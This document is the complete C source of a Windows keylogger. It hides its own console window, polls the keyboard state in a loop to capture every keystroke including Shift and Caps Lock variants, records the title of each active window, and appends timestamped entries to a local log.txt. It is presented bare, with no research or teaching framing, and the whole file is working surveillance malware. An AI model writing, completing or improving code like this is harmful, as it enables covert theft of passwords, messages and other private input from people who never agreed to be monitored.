#define _WIN32_WINNT 0x0500
#define WIN32_LEAN_AND_MEAN

#include <windows.h>

typedef struct KEYS
{
	int inputL;
	char outputL[7];
	char outputH[7];
} KEYS;


KEYS keys[]={
	{8,"b","b"},
	{13,"e","e"},
	{27,"[ESC]","[ESC]"},
	{112,"[F1]","[F1]"},
	{113,"[F2]","[F2]"},
	{114,"[F3]","[F3]"},
	{115,"[F4]","[F4]"},
	{116,"[F5]","[F5]"},
	{117,"[F6]","[F6]"},
	{118,"[F7]","[F7]"},
	{119,"[F8]","[F8]"},
	{120,"[F9]","[F9]"},
	{121,"[F10]","[F10]"},
	{122,"[F11]","[F11]"},
	{123,"[F12]","[F12]"},
	{192,"`","~"},
	{49,"1","!"},
	{50,"2","@"},
	{51,"3","#"},
	{52,"4","$"},
	{53,"5","%"},
	{54,"6","^"},
	{55,"7","&"},
	{56,"8","*"},
	{57,"9","("},
	{48,"0",")"},
	{189,"-","_"},
	{187,"=","+"},
	{9,"[TAB]","[TAB]"},
	{81,"q","Q"},
	{87,"w","W"},
	{69,"e","E"},
	{82,"r","R"},
	{84,"t","T"},
	{89,"y","Y"},
	{85,"u","U"},
	{73,"i","I"},
	{79,"o","O"},
	{80,"p","P"},
	{219,"[","{"},
	{221,"","}"},
	{65,"a","A"},
	{83,"s","S"},
	{68,"d","D"},
	{70,"f","F"},
	{71,"g","G"},
	{72,"h","H"},
	{74,"j","J"},
	{75,"k","K"},
	{76,"l","L"},
	{186,";",":"},
	{222,"'","\""},
	{90,"z","Z"},
	{88,"x","X"},
	{67,"c","C"},
	{86,"v","V"},
	{66,"b","B"},
	{78,"n","N"},
	{77,"m","M"},
	{188,",","<"},
	{190,".",">"},
	{191,"/",".?"},
	{220,"\\","|"},
	{17,"[CTRL]","[CTRL]"},
	{91,"[WIN]","[WIN]"},
	{32," "," "},
	{92,"[WIN]","[WIN]"},
	{44,"[PRSC]","[PRSC]"},
	{145,"[SCLK]","[SCLK]"},
	{45,"[INS]","[INS]"},
	{36,"[HOME]","[HOME]"},
	{33,"[PGUP]","[PGUP]"},
	{46,"[DEL]","[DEL]"},
	{35,"[END]","[END]"},
	{34,"[PGDN]","[PGDN]"},
	{37,"[LEFT]","[LEFT]"},
	{38,"[UP]","[UP]"},
	{39,"[RGHT]","[RGHT]"},
	{40,"[DOWN]","[DOWN]"},
	{144,"[NMLK]","[NMLK]"},
	{111,"/","/"},
	{106,"*","*"},
	{109,"-","-"},
	{107,"+","+"},
	{96,"0","0"},
	{97,"1","1"},
	{98,"2","2"},
	{99,"3","3"},
	{100,"4","4"},
	{101,"5","5"},
	{102,"6","6"},
	{103,"7","7"},
	{104,"8","8"},
	{105,"9","9"},
	{110,".","."}
};

void zeroMem(char *buf, int len)
{
	for(int i=0; i<len; i++){
		buf[i] = '\0';
	}
	return;
}

int saveBuffer(char *buf)
{
	SYSTEMTIME st;
	GetLocalTime(&st);

	char buffer[8192];
	unsigned long bytesWritten;
	HANDLE out;

	wsprintf(buffer, "[%02d-%02d-%d  %02d:%02d:%02d] %s\r\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, buf);
	out = CreateFile("log.txt", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
	SetFilePointer(out, 0, NULL, FILE_END);

	WriteFile (out, buffer, lstrlen(buffer), &bytesWritten, NULL);
	CloseHandle (out);

	return 0;
}
int main()
{
	char path[260];
	GetModuleFileName(NULL,path,260);
	HWND console = FindWindow("ConsoleWindowClass", path);

	if(IsWindow(console)){
		ShowWindow(console,SW_HIDE); // hides the window
	}

	char buffer[4096], buffer2[4096], windowtxt[100];

	int err = 0, x = 0, i = 0, state, shift, bKstate[256]={0};
	HWND active = GetForegroundWindow();
	HWND old = active;

	zeroMem(windowtxt,sizeof(windowtxt));
	zeroMem(buffer,sizeof(buffer));
	zeroMem(buffer2,sizeof(buffer2));

	while (err == 0) {
		Sleep(8);

		active = GetForegroundWindow();
		if (active != old) {
			old = active;
			GetWindowText(old,windowtxt,99);

			if(lstrcmp(windowtxt, "")) {
				wsprintf(buffer2, "%s\t\t[Changed Window: %s]", buffer, windowtxt); 
				err =saveBuffer(buffer2);//changed window? write to the log
				zeroMem(buffer,sizeof(buffer));
				zeroMem(buffer2,sizeof(buffer2));
			}
		}

		for (i = 0; i < 92; i++) {
			shift = GetKeyState(VK_SHIFT);

			x = keys[i].inputL;

			if (GetAsyncKeyState(x) & 0x8000) {
				if (((GetKeyState(VK_CAPITAL)) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1; // upercase a-z
				else if (((GetKeyState(VK_CAPITAL)) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2; //lowercase a-z
				else if (shift < 0) // shift
					bKstate[x] = 3; // upercase
				else bKstate[x] = 4; // lowercase
			} 
			else {
				if (bKstate[x] != 0) {
					state = bKstate[x];
					bKstate[x] = 0;

					if (x == 8) {
						buffer[lstrlen(buffer)-1] = 0;
						continue;
					} else if (lstrlen(buffer) > 511 - 70) {
						active = GetForegroundWindow();
						GetWindowText(active,windowtxt,99);

						wsprintf(buffer2,"%s [Buffer full] (%s)",buffer,windowtxt);
						err = saveBuffer(buffer2);
						zeroMem(buffer,sizeof(buffer));
						zeroMem(buffer2,sizeof(buffer2));

						continue;
					} else if (x == 13) {//backspace
						if (lstrlen(buffer) == 0) 
							continue;

						active = GetForegroundWindow();
						GetWindowText(active,windowtxt,99);

						wsprintf(buffer2,"%s [Ret] [%s]",buffer,windowtxt);
						err = saveBuffer(buffer2);
						zeroMem(buffer,sizeof(buffer));
						zeroMem(buffer2,sizeof(buffer2));

						continue;
					} else if (state == 1 || state == 3) 
						lstrcat(buffer,keys[i].outputH);
					else if (state == 2 || state == 4) 
						lstrcat(buffer,keys[i].outputL);
				}
			}
		}
	}
}